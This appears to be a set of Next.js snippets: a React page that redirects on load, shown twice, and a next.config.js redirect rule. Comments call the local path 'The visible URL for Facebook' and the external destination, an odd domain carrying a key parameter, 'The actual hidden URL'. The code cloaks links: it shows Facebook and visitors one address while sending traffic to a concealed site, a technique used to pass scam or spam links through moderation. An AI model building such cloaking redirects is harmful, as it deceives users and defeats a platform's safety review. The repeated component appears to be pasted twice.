// pages/redirect-to-hidden-url.js
import { useEffect } from 'react';
import { useRouter } from 'next/router';

const RedirectPage = () => {
  const router = useRouter();

  useEffect(() => {
    router.push('https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb');
  }, [router]);

  return <p>Redirecting...</p>;
};

export default RedirectPage;
// pages/redirect-to-hidden-url.js
import { useEffect } from 'react';
import { useRouter } from 'next/router';

const RedirectPage = () => {
  const router = useRouter();

  useEffect(() => {
    // Redirect to the hidden URL
    router.push('https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb');
  }, [router]);

  return <p>Redirecting...</p>;
};

export default RedirectPage;
// next.config.js
module.exports = {
  async redirects() {
    return [
      {
        source: '/redirect-to-hidden-url',  // The visible URL for Facebook
        destination: 'https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb',  // The actual hidden URL
        permanent: false, // Use true if you want a permanent redirect
      },
    ];
  },
};
